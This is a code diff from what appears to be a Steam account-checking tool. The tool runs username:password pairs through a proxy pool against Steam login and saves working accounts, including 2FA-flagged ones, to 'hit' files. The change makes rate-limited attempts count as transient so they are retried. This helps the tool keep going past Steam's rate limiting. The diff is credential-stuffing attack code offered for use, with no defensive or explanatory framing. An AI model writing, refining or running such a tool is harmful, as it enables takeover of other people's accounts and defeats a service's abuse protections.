@@ -275,8 +275,8 @@ class ProxyEngine:
 
     def active_count(self) -> int:
         return len(self.pool)
-TRANSIENT = {"empty", "server_error", "malformed"}
-DEFINITIVE = {"invalid", "2fa", "ratelimit"}
+TRANSIENT = {"empty", "server_error", "malformed", "ratelimit"}
+DEFINITIVE = {"invalid", "2fa"}
 class SteamAuth:
     def __init__(self, timeout: int = 15, poll_attempts: int = 4, poll_delay: float = 1.5):
         self.timeout = timeout
@@ -548,12 +548,6 @@ def check_item(args, ui: UI, max_retries: int):
                 elif result_type == "2fa":
                     save_hit("custom.txt", f"{username}:{password} | 2FA")
                     ui.record_result(c=1)
-                elif result_type == "ratelimit":
-                    log_error(ui, username, "rate limited")
-                    if max_retries == 0 or attempt < max_retries:
-                        attempt += 1; continue
-                    save_hit("unresolved.txt", f"{username}:{password}")
-                    ui.record_result(e=1)
                 return
             if result_type in TRANSIENT:
                 attempt += 1
